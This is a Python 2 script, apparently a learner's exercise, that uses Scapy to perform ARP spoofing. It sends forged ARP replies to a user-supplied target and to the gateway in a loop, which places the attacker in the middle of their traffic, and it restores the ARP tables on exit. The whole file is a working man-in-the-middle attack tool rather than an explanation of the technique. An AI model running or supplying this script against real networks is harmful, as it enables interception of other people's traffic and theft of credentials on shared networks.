#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
#get the mac of the ipMachine
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boradcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_boradcast, timeout=1, verbose=False)[0]
    # print(answered_list.summary())
    return answered_list[0][1].hwsrc #this will return the value of the mac of ip given
    
#to spoof the target machine
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op =2, pdst=target_ip, hwdst=target_mac ,psrc=spoof_ip) 
    #op=2, means i need to send arp response, if it=1 this mean in send arp request.
    #pdst=targetIp, hwdst=targetMac, psrc=spoofSourcIP
    scapy.send(packet, verbose= False) #to send the packet
    print(packet.show())


def restor(dist_ip, sourc_ip):
    dist_mac = get_mac(dist_ip)
    sourc_mac = get_mac(sourc_ip)
    packet = scapy.ARP(op =2, pdst=dist_ip, hwdst=dist_mac ,psrc=sourc_ip, hwsrc=sourc_mac) 
    scapy.send(packet, count=4, verbose= False) 
    print(packet.show())

#get the infor from user
target_ip = raw_input('Enter the target_ip: ')
default_getWay = raw_input('Enter the default get way ip: ')

try:
    packet_sent_count = 0
    while True: #this loop will keep send the arp paket
        spoof(target_ip,default_getWay) #tell the target im the getway
        spoof(default_getWay,target_ip) #tell the getway im the machne
        packet_sent_count += 2
        #python2 output
        print("\r[+]Packet Sent: " + str(packet_sent_count)), #by adding [,] will not print newline and stor the values in buffer
        sys.stdout.flush() #this will print the value of print in the buffrr imediatlly
        # print("\r[+]Packet Sent: " + str(packet_sent_count), end="") #by adding \r[end =""] will not print newline and  print the result
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .....quitting. \n")
    restor(target_ip, default_getWay)
    restor(default_getWay, target_ip)
    print('[+]ARP Table has been restord successfully :)')






